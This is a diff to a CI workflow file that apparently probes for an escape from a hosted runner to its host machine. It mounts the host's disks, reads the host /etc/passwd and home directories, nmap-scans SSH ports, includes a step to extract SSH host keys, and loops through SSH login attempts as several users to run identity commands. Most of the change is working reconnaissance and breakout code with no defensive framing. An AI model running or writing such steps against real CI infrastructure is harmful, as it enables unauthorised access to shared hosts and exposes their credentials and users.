@@ -20,15 +20,23 @@ jobs:
         run: |
           sudo mount /dev/sda1 /mnt/host1 || echo "Mount sda1 failed"
           sudo mount /dev/root /mnt/host2 || echo "Mount root failed"
+          df -h | grep mnt
       
-      - name: Verify cloudenv user exists on host
+      - name: Verify users exist on host
         run: |
-          echo "=== Checking for cloudenv user on host ==="
-          sudo cat /mnt/host2/etc/passwd | grep cloudenv || echo "cloudenv user NOT FOUND"
-          sudo cat /mnt/host2/etc/passwd | grep -E "runner|ubuntu|azureuser|root" | head -10
+          echo "=== Checking for users on mounted host filesystems ==="
           echo ""
-          echo "Home directories on host:"
-          sudo ls -la /mnt/host2/home/ || echo "No /home directory"
+          echo "Contents of /mnt/host1/home:"
+          sudo ls -la /mnt/host1/home/ 2>/dev/null || echo "/mnt/host1/home not found"
+          echo ""
+          echo "Contents of /mnt/host2/home:"
+          sudo ls -la /mnt/host2/home/ 2>/dev/null || echo "/mnt/host2/home not found"
+          echo ""
+          echo "Users from /etc/passwd:"
+          sudo cat /mnt/host2/etc/passwd 2>/dev/null | grep -E "runner|cloudenv|ubuntu|azureuser|/home" || echo "No users in passwd"
+          echo ""
+          echo "All home directories found:"
+          sudo find /mnt -type d -name "home" -exec ls -la {} \; 2>/dev/null
       
       - name: Check SSH configuration on host
         run: |
@@ -52,8 +60,8 @@ jobs:
           
           echo ""
           echo "=== Network scan of host ==="
-          sudo apt install nmap
-          sudo nmap -Pn --open $HOST_IP -p 22,2000,2222,22000 || echo "nmap failed"
+          # Quick scan common SSH ports
+          sudo nmap -Pn --open $RUNNER_IP -p 22,2000,2222,22000 || echo "nmap failed"
       
       - name: Extract SSH host keys
         run: |
@@ -106,8 +114,8 @@ jobs:
                 -o UserKnownHostsFile=/dev/null \
                 -o ConnectTimeout=3 \
                 -o BatchMode=yes \
-                $user@$HOST_IP \
-                'whoami; hostname; id; pwd' 2>&1 && break || echo "Failed: $user@$HOST_IP:$port"
+                $user@$RUNNER_IP \
+                'whoami; hostname; id; pwd' 2>&1 && break || echo "Failed: $user@$RUNNER_IP:$port"
             done
           done
       
